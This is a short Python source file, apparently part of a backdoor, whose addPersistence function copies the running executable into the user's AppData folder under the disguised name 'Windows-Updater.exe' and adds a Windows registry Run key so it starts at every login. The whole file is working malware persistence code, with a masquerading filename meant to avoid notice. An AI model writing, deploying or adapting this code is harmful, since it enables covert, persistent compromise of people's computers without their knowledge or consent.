import os
import subprocess as sp
import shutil
import sys


def addPersistence():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if os.path.exists(backdoor_location):
        return "already-enabled"
    try:
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
            shell=True)
        return "enabled"
    except Exception as e:
        return f"error: {e}"
